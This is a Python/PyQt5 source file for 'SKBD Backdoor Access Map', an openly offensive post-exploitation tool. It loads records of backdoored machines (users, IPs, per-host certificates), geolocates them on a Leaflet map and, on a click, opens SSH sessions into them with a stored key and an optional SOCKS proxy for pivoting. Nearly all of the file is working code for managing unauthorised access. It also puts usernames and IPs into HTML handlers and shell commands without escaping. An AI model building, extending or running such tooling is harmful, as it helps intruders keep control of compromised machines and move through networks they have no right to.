#!/usr/bin/python3
# @Мартин.
import os
import sys
import json
import re
import subprocess
import configparser
import ipaddress
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed  

from lib.log_cat import *
import threading

from PyQt5.QtGui import QCursor
from PyQt5.QtCore import QPoint, Qt, QUrl, QTimer, QObject, pyqtSlot, QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QGraphicsOpacityEffect 
from PyQt5.QtGui import QPixmap, QIcon
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtWebChannel import QWebChannel

 
from lib.location import Location   
import random  
import socket   
log = LogCat()
BLACK   = "\033[30m"
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"
WHITE   = "\033[37m"
BRIGHT_PURPLE = "\033[95m"
RESET = "\033[0m"

LOGO = f'''{BRIGHT_PURPLE}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⢉⠭⠀⠴⠘⠩⡢⠏⠘⡵⢒⠬⣍⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⣡⠔⠃⠀⠰⠀⠀⠀⠀⠈⠂⢀⠀⢋⠞⣬⢫⣦⣍⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢫⣼⠿⠁⠀⠀⠀⠐⠀⠀⠰⠀⠢⠈⠀⠠⠀⢚⡥⢏⣿⣿⣷⡵⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢓⣽⡓⡅⠀⠀⠀⠄⠀⠀⠄⠀⠁⠀⠀⠌⢀⠀⡸⣜⣻⣿⣿⣿⣿⣼⡀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡤⣤⣄⣠⠤⣄⠀⠀⠀⠀⠀⠀⠀⢀⣧⣿⡷⠹⠂⠀⠂⠀⢀⠠⠈⠀⠌⠀⠁⢈⠀⠄⢀⡷⣸⣿⣿⣿⣿⣿⣧⠃⠀⡴⢋⢠⣤⣦⣬⣕⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣔⣵⣿⣻⣯⣍⣉⠚⢕⢆⠀⠀⠀⠀⠀⢸⢾⣽⡷⡂⠀⠀⠄⠂⠀⡀⠄⠂⠀⠌⠀⡀⠀⢀⡾⣯⢿⣿⣿⣿⣿⣿⣿⠰⠸⠠⢠⣾⣿⣿⣷⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⣿⣿⠿⠿⢿⣿⣇⡛⡻⣧⠀⠀⠀⠀⢼⢸⡟⡧⣧⠀⠃⠀⡀⠄⠀⢀⠠⠘⠀⠠⠀⠀⡟⢧⣛⣿⣿⣿⣿⣿⣿⣧⠇⠀⡇⢻⣿⣿⣿⠟⠻⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠁⣠⣤⠀⠙⢿⣿⡤⢘⣆⠀⠀⠀⢹⣼⣿⡽⠖⠁⠀⢤⠀⠀⡐⠀⢀⠐⠈⠀⢠⠖⠙⠣⠟⣻⢿⣿⣟⣿⡿⠃⠀⠀⠃⢼⣿⣧⠀⠀⠀⠸⣿⣣⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣆⣿⡟⠀⠀⠀⣿⡇⠰⢸⠀⠀⠀⡸⡻⡕⠉⠀⠀⡐⠀⠈⠁⠀⠀⢠⠀⡴⠀⡠⠀⢀⠤⡲⠟⣉⠻⣿⣟⠁⠀⠀⠀⡅⢺⣿⣿⠃⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠛⠉⠀⠀⠀⣀⡿⣗⠧⣼⠀⠄⡎⣿⣇⣧⣀⠑⢆⠀⠀⠀⢹⢄⢀⢧⠊⢀⠊⠀⠘⡡⣪⡴⠛⢻⣷⣜⣿⣦⠀⠀⡀⡿⣸⣿⣿⡆⠀⠀⡠⢐⠫⠉⠩⠭⣗⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⢹⣷⣻⠇⣿⠘⡀⣿⣿⣿⣿⠛⠛⢦⣙⠄⠀⢈⣫⢼⠀⠤⠁⠀⣠⣾⣿⡇⠀⠐⠂⢻⣿⣟⣿⡇⢠⠃⣧⣿⣿⣾⠁⢀⢎⣴⡶⡿⢿⣟⣷⢮⡝⢿⣷⠤⡀⠀
⠀⠀⠀⠀⠀⠀⠈⣽⣯⢿⣣⡹⢰⠘⣿⡿⣹⣿⠀⠀⠹⣿⡿⣷⣬⣯⣾⣷⣤⣴⣾⡟⣍⡿⠃⠀⠀⠀⢸⣿⣿⣩⣒⣵⣷⣿⣿⡿⠃⠀⡞⢺⣿⣿⣯⢿⠉⠀⠉⠛⢦⣻⣇⠘⡆
⠀⠀⠀⠀⠀⠀⣀⣿⣾⡾⣿⣵⡢⠳⢿⣷⢹⣿⣆⠀⠀⠈⠉⢉⣽⢟⣿⠟⢻⢿⣷⣄⡁⠀⠀⠀⠀⣀⣾⡟⣍⣿⣿⣿⣿⣿⣿⡗⠀⠀⠇⣽⣿⣿⣿⡼⠀⠀⣠⡤⣀⠿⠏⣴⠇
⠀⠀⠀⠀⠀⠀⠸⡼⣿⣿⣽⣿⣿⣶⣬⣿⣯⢿⣷⣥⠶⣒⣶⣾⠏⠐⠙⠀⠈⠚⡌⢪⣿⣧⣖⠦⡭⠿⢛⣼⣿⣿⢿⣿⣿⡿⠝⠁⠀⠰⢀⣿⣿⣾⣿⡇⠀⠀⠻⢿⡝⠲⠛⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⡿⠻⢷⣮⣉⣭⣡⣟⡱⠀⠀⡀⢀⡞⢀⢠⡀⠹⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣟⠋⠀⠀⠀⡠⡡⣹⣿⣿⣿⠿⠡⢀⣀⠀⠾⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠽⢿⢿⣻⡿⠈⢀⣶⣿⣿⣿⣿⡽⠃⢀⡴⣰⣿⢤⣓⢿⣿⣄⠙⣻⣷⡟⣿⣿⣿⣽⡻⣿⠿⠧⡶⣒⢭⣺⣽⣿⠟⢍⢀⠀⡉⠑⢶⣯⡲⣄⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⣟⣷⣞⡟⠉⣴⡿⣯⣷⣿⣿⡟⡡⢀⣜⣼⣿⣿⣎⢳⢿⢻⣿⡄⠑⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣾⣿⣿⢃⣠⣤⢖⡾⢷⡲⣆⡳⣿⣮⢢⡄⠀⠀
⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣄⢈⢆⠻⢿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡧⢨⣲⣷⣿⠋⣟⣶⣀⣳⡖⣿⣇⣃⠀⠀
⠀⣘⡸⣞⣿⣿⣿⣿⣿⣿⣿⡿⠁⣺⣣⣿⣿⣿⣿⠎⢀⢢⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣢⢀⠡⡘⢪⡯⡻⣿⣿⣿⣿⣿⣿⣻⣟⢧⣽⣿⣿⠀⠀⣎⣱⡏⣏⣿⣯⡽⠀⠀
⠀⣿⣧⣼⣿⡟⠛⠛⠿⢟⠟⣁⣼⣿⣿⠛⢉⡜⠁⡠⣠⣷⢿⣿⡿⣿⣿⣿⣿⠟⠉⠙⠛⢯⣽⣯⠷⣄⠑⠜⠑⡷⡜⢿⠿⠟⠛⠉⠀⢸⢺⣾⣿⣿⣷⣄⣀⠏⣱⣿⣿⣿⠀⠀⠀
⠀⢹⣿⣾⣿⣿⣤⡤⠔⢑⣡⣾⡿⡿⠁⡠⠋⠀⡀⢀⣿⡟⣿⣿⣿⡙⣿⣻⣿⡄⠀⠀⠀⠀⠉⠻⣿⣟⣧⡄⠀⠘⣟⢦⡱⣄⠀⠀⠀⢸⣼⣿⢿⣿⣿⣷⣤⣾⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠹⢿⣿⠏⣰⣧⣾⣿⣿⠟⠋⠀⡰⠡⡡⠀⣠⣿⣿⣿⣿⣿⣿⣗⢸⣿⣿⣷⠀⠀⠀⠀⠀⠀⠱⡹⣟⣿⣦⡁⠈⠳⢕⢄⠑⠂⠐⢾⣿⣿⣿⣿⣿⠛⠿⠟⠛⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣯⣼⣿⣿⠋⠁⠀⠀⠀⠀⡇⠐⠀⢠⣿⣿⡝⣿⠃⠈⢻⡞⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠉⢻⣷⣾⣿⣦⡄⠀⠀⠈⠐⢺⣽⣿⣿⡎⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣻⡟⠁⠀⠀⠀⠀⠀⢸⡇⠀⢀⣿⣿⣿⣿⠏⠀⠀⢸⠳⣜⣹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⢿⣿⣿⣷⣶⣶⣶⣿⣿⢟⣻⣿⢟⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣿⡦⠀⠀⠀⠀⠀⠘⡇⠰⣼⡿⡿⣾⡏⠀⠀⠀⢸⠣⣹⣾⣿⡹⠀⡠⢄⣂⢤⠀⠀⠀⠀⠀⠈⠉⠻⣟⢿⣾⣚⣿⣿⣿⣿⣽⡏⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⢛⣿⡟⠀⠀⠀⠀⠀⠀⢷⣀⢻⣷⣟⣻⡇⠀⠀⢀⢯⣅⣿⣷⣿⠇⣜⣾⣿⣿⣿⣧⣀⠀⠀⠀⠀⠀⠀⠈⠉⠸⠿⣿⠏⠘⠔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠈⢻⡯⢿⣿⡿⡴⣀⡠⣪⡷⣽⣿⣿⡿⢚⣿⣿⡟⠀⠙⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⡈⠛⠿⠽⢞⢋⠜⠻⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠛⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RESET}
Maptnh@S-H4CK13   |  SKBD-Map Backddor Access Map | https://github.com/MartinxMax/'''

TITLE = 'SKBD | Backdoor Access Map'
MACHINES_DIR = "./machines"
ICON_PATH = "./location/color_1.png"
SSH_KEY_PATH = './auth_protect/id_rsa'
DEFAULT_SSH_PORT = 22
MAX_WORKERS = 8   
 
HTML = r'''
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>SKBD \| Backdoor Access Map</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
html, body, #map { height: 100%; margin:0; padding:0; background-color:#000; }
.leaflet-marker-icon { cursor: pointer !important; }
 
.ip-tooltip{ 
    background: rgba(20, 0, 50, 0.95);  
    color:#9933ff;                      
    font-size:14px; 
    padding:6px 12px; 
    border-radius:4px; 
    pointer-events: none; 
    font-weight: bold;
    border: 1px solid #9933ff;          
}

.user-popup { 
    background: rgba(10, 10, 10, 0.98) !important; 
    color:#ffffff; 
    font-size:14px; 
    padding:15px !important; 
    border-radius:8px !important;
    border: 2px solid #9933ff !important;
    min-width: 180px;
    box-shadow: 0 0 15px rgba(153, 51, 255, 0.5) !important;
}

.popup-title {
    text-align: center;
    font-size:15px;
    font-weight: bold;
    color:#9933ff;
    margin-bottom:10px;
    padding-bottom:5px;
    border-bottom: 1px solid #9933ff;
}

.user-item {
    padding: 8px 12px;
    margin: 5px 0;
    border-radius:6px;
    cursor: pointer;
    background: rgba(50, 0, 100, 0.3);  
    transition: all 0.2s;
}
.user-item:hover {
    background: rgba(153, 51, 255, 0.2); 
    transform: translateX(3px);
    border-left: 3px solid #9933ff;       
}

.custom-popup .leaflet-popup-content-wrapper {
    background: rgba(10, 10, 10, 0.98) !important;
    border: 2px solid #9933ff !important;
    border-radius: 8px !important;
    box-shadow: 0 0 15px rgba(153, 51, 255, 0.5) !important;
    padding: 0 !important;  
}

.custom-popup .leaflet-popup-tip {
    background: rgba(10, 10, 10, 0.98) !important;
    border: 2px solid #9933ff !important;
    box-shadow: 0 0 10px rgba(153, 51, 255, 0.3) !important;
}

.user-list-container {
    max-height: 200px;  
    overflow-y: auto;   
    padding-right: 5px; 
    margin-top: 5px;
}

.user-list-container::-webkit-scrollbar {
    width: 6px;        
}
.user-list-container::-webkit-scrollbar-track {
    background: rgba(50, 0, 100, 0.2) !important; 
    border-radius: 3px;
}
.user-list-container::-webkit-scrollbar-thumb {
    background: #9933ff !important;  
    border-radius: 3px;
}
.user-list-container::-webkit-scrollbar-thumb:hover {
    background: #8000ff !important;
}

.socks-checkbox-container {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 0 12px 8px;
    color: #9933ff;
    font-size: 13px;
    cursor: pointer;
}

.socks-checkbox {
    display: none;
}

.checkbox-custom {
    width: 18px;
    height: 18px;
    border: 2px solid #9933ff;
    border-radius: 4px;
    position: relative;
    transition: all 0.2s ease;
    background: transparent;
}

.socks-checkbox:checked + .checkbox-custom {
    background-color: #33cc33;
    border-color: #9933ff;  
}

.checkbox-custom::after {
    content: "";
    position: absolute;
    top: 1px;
    left: 5px;
    width: 6px;
    height: 12px;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
    opacity: 0;
    transition: all 0.2s ease;
}

.socks-checkbox:checked + .checkbox-custom::after {
    opacity: 1;
}

.socks-checkbox-container:hover .checkbox-custom {
    border-color: #b366ff;
    box-shadow: 0 0 8px rgba(153, 51, 255, 0.4);
}
.socks-checkbox:checked + .checkbox-custom:hover {
    border-color: #4cd964;
    box-shadow: 0 0 8px rgba(51, 204, 51, 0.4);
}
#searchBox { 
    position:absolute; top:10px; right:10px; z-index:9999; 
    background:rgba(0,0,0,0.7); color:#fff; padding:6px; border-radius:6px; width:220px; 
}
#searchInput { 
    width:100%; padding:4px 6px; border-radius:4px; border:none; outline:none; background:#222; 
    color:#9933ff !important;  
}
#searchResults { max-height:150px; overflow-y:auto; margin-top:4px; font-size:12px;}
.searchItem { padding:4px; cursor:pointer;}
.searchItem:hover { 
    background: rgba(153, 51, 255, 0.2) !important;  
}
</style>
</head>
<body>
<div id="map"></div>
<div id="searchBox">
    <input type="text" id="searchInput" placeholder="Search IP / Username"/>
    <div id="searchResults"></div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="qrc:///qtwebchannel/qwebchannel.js"></script>
<script>
let map = L.map('map').setView([20,0],2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
    attribution:'&copy; OSM &copy; CARTO', subdomains:'abcd', maxZoom:19
}).addTo(map);

let markers = {};
let dataStore = {};
let bridge = null;

new QWebChannel(qt.webChannelTransport, function(channel) {
    bridge = channel.objects.bridge;
});

const defaultIcon = L.icon({
    iconUrl: './location/color_1.png',
    iconSize: [32, 32],
    iconAnchor: [16, 32]
});

function updateMarkers(data_obj) {
    dataStore = data_obj || {};
    for(let ip in markers) {
        if(!(ip in dataStore)) {
            map.removeLayer(markers[ip]);
            delete markers[ip];
        }
    }
    
    for(let ip in dataStore) {
        const item = dataStore[ip];
        const coords = (''+item.lalo).split(',').map(x=>parseFloat(x));
        if(coords.length < 2 || isNaN(coords[0]) || isNaN(coords[1])) continue;
        
        const ipTooltip = `<div>${ip}</div>`;
     
        let usersPopup = `<div class="user-popup">
    <div class="popup-title">Login</div>
    <div class="socks-checkbox-container">
    <input type="checkbox" id="socks-${ip}" class="socks-checkbox"/>
    <label for="socks-${ip}" class="checkbox-custom"></label>
    <span>Enable Proxy</span>
</div>
    <div class="user-list-container">  
`;
item.users.forEach(user => {
    usersPopup += `<div class="user-item" onclick="executeSSH('${ip}', '${user}')">${user}</div>`;
});
usersPopup += `</div></div>`;  
        
        if(markers[ip]) {
            markers[ip].setLatLng(coords);
        } else {
            const marker = L.marker(coords, {icon: defaultIcon}).addTo(map);
            marker.bindTooltip(ipTooltip, {
                permanent: false, direction: 'top', offset: [0, -35], className: 'ip-tooltip'
            });
            marker.bindPopup(usersPopup, { 
    maxWidth: 220,
    className: 'custom-popup'   
});
            markers[ip] = marker;
        }
    }
}
 
function executeSSH(ip, user) {
    if(!bridge) { alert('Bridge not ready!'); return; }
    try {
        if(markers[ip]) markers[ip].closePopup();
 
        const isSocks = document.getElementById(`socks-${ip}`)?.checked || false;
 
        bridge.executeSSH(ip, user, isSocks);
    } catch(e) {
        console.error('SSH Error:', e);
        alert( e.message);
    }
}

document.getElementById('searchInput').addEventListener('input', function() {
    const q = this.value.trim().toLowerCase();
    const resultsDiv = document.getElementById('searchResults');
    resultsDiv.innerHTML = '';
    if(!q) return;
    
    for(let ip in dataStore) {
        const item = dataStore[ip];
        const ipMatch = ip.toLowerCase().includes(q);
        const userMatch = item.users.some(user => user.toLowerCase().includes(q));
        if(ipMatch || userMatch) {
            const div = document.createElement('div');
            div.className = 'searchItem';
            div.textContent = `${ip} - ${item.users.join(', ')}`;
            div.onclick = () => {
                const coords = (''+item.lalo).split(',').map(x=>parseFloat(x));
                if(coords.length >=2) map.setView([coords[0], coords[1]], 10);
                if(markers[ip]) markers[ip].openPopup();
            };
            resultsDiv.appendChild(div);
        }
    }
});
</script>
</body>
</html>
'''

def get_random_available_port(start=10000, end=65535):
    max_retry = 20
    retry = 0
    while retry < max_retry:
        port = random.randint(start, end)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.05)
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
        retry += 1
    return random.randint(50000, 65535)

def parse_info_conf(conf_path, md5_dir):
    config = configparser.ConfigParser()
    try:
        config.read(conf_path, encoding='utf-8')
    except Exception as e:
        log.error(f"Failed to parse configuration file {conf_path}: {e}")
        return None
    
    info = {'users': [], 'ips': [], 'sn': '', 'md5': md5_dir}
    if 'USERS' in config and config['USERS'].get('users'):
        info['users'] = [u.strip() for u in config['USERS']['users'].strip().split(',') if u.strip()]
    if 'IPS' in config and config['IPS'].get('ips'):
        info['ips'] = [ip.strip() for ip in config['IPS']['ips'].strip().split(',') if ip.strip()]
    if 'SN' in config and config['SN'].get('sn'):
        info['sn'] = config['SN']['sn'].strip()
    return info

 
def is_public_ip(ip_str):
    try:
        ip = ipaddress.ip_address(ip_str)
        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast)
    except ValueError:
        return False

 
def process_md5_dir(md5_dir, geo_cache, location_):
    ip_items = []
    dir_path = os.path.join(MACHINES_DIR, md5_dir)
    if not os.path.isdir(dir_path):
        return ip_items
    
    conf_path = os.path.join(dir_path, 'info.conf')
    if not os.path.exists(conf_path):
        log.warning(f"info.conf does not exist: {conf_path}")
        return ip_items
    
    conf_info = parse_info_conf(conf_path, md5_dir)
    if not conf_info:
        return ip_items
    
    for ip in conf_info['ips']:
        if not is_public_ip(ip):
            continue
 
        if ip in geo_cache:
            geo_data = geo_cache[ip]
        else:
            try:
                geo_data = location_.get(ip)
                geo_cache[ip] = geo_data   
            except Exception as e:
                log.error(f"Failed to process IP {ip}: {e}")
                continue
        
        ip_items.append({
            'ip': ip,
            'users': conf_info['users'],
            'lalo': geo_data['lalo'],
            'sn': conf_info['sn'],
            'md5': conf_info['md5'],
            'icon': ICON_PATH
        })
    return ip_items

 
def load_machines_data():
    machines_data = {}
    location_ = Location()
    geo_cache = {}   
    
    if not os.path.exists(MACHINES_DIR):
        log.error(f"'machines' directory does not exist: {MACHINES_DIR}")
        return machines_data
    
 
    md5_dirs = [d for d in os.listdir(MACHINES_DIR) if os.path.isdir(os.path.join(MACHINES_DIR, d))]
    if not md5_dirs:
        log.warning("No hosts found")
        return machines_data
 
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
 
        future_to_dir = {executor.submit(process_md5_dir, d, geo_cache, location_): d for d in md5_dirs}
 
        for future in as_completed(future_to_dir):
            ip_items = future.result()
            for item in ip_items:
                ip = item['ip']
                if ip not in machines_data:   
                    machines_data[ip] = item
 
    return machines_data

 
class Bridge(QObject):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent_window = parent
        self.machines_data = {}
    
    @pyqtSlot(str, str, bool)  
    def executeSSH(self, ip, user, isSocks):
        if ip not in self.machines_data:
            log.error(f"Information for IP {ip} not found")
            return
        
        device_info = self.machines_data[ip]
        cert_path = f'./machines/{device_info["md5"]}/skbd.pub'
    
        ssh_cmd = (
            f'ssh -i {SSH_KEY_PATH} '
            f'-o CertificateFile={cert_path} '
            f'-p {DEFAULT_SSH_PORT} '
        )
 
        proxy_port = None
        if isSocks:
            proxy_port = get_random_available_port()
            ssh_cmd += f'-D {proxy_port} '
            log.info(f"IP {ip} SOCKS proxy enabled: 127.0.0.1:{proxy_port}")
        ssh_cmd += f'{user}@{ip}'
        
        try:
            if sys.platform.startswith('win'):
                subprocess.Popen(f'cmd /k {ssh_cmd}', creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                for term in ['x-terminal-emulator', 'xterm', 'gnome-terminal', 'konsole']:
                    if subprocess.run(['which', term], capture_output=True, text=True).returncode == 0:
                        subprocess.Popen([term, '-e', ssh_cmd])
                        break
                else:
                    subprocess.Popen(['bash', '-c', ssh_cmd])
        except Exception as e:
            log.error(f"SSH execute failed: {str(e)}")
            
                
    def set_machines_data(self, data):
        self.machines_data = data

 
class DataLoader(QThread):
    dataLoaded = pyqtSignal(dict)
    def run(self):
        data = load_machines_data()
        self.dataLoaded.emit(data)

 
class MapWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(TITLE)
        self.resize(1280, 800)
        
        icon_path = os.path.join(os.path.dirname(__file__), "location", "ico.png")
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
        
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.layout = QVBoxLayout(self.central_widget)
        self.layout.setContentsMargins(0, 0, 0, 0)
        
        self.view = QWebEngineView()
        self.layout.addWidget(self.view)
 
        
        self.html_path = os.path.join(os.path.dirname(__file__), "map_temp.html")
        with open(self.html_path, "w", encoding="utf-8") as f:
            f.write(HTML)
        
        self.channel = QWebChannel()
        self.bridge = Bridge(self)
        self.channel.registerObject('bridge', self.bridge)
        self.view.page().setWebChannel(self.channel)
        
        self.view.loadFinished.connect(self.on_load_finished)
        self.view.load(QUrl.fromLocalFile(os.path.abspath(self.html_path)))
        self.machines_data = {}
    
    def on_load_finished(self, ok):
        if not ok:
            log.error("Failed to load map page")
 
            return
        self.loader = DataLoader()
        self.loader.dataLoaded.connect(self.on_data_loaded)
        self.loader.start()
    
    def on_data_loaded(self, data):
        self.machines_data = data
        self.bridge.set_machines_data(data)
        self.update_map_markers()
        log.info(f"Added {len(data)} backdoor hosts")


    def update_map_markers(self):
        try:
            js = f"updateMarkers({json.dumps(self.machines_data, ensure_ascii=False)});"
            self.view.page().runJavaScript(js)
        except Exception as e:
            log.error(f"Failed to update map markers: {e}")

if __name__ == "__main__":
    print(LOGO)
    app = QApplication(sys.argv)
    win = MapWindow()
    win.showMaximized()
    sys.exit(app.exec_())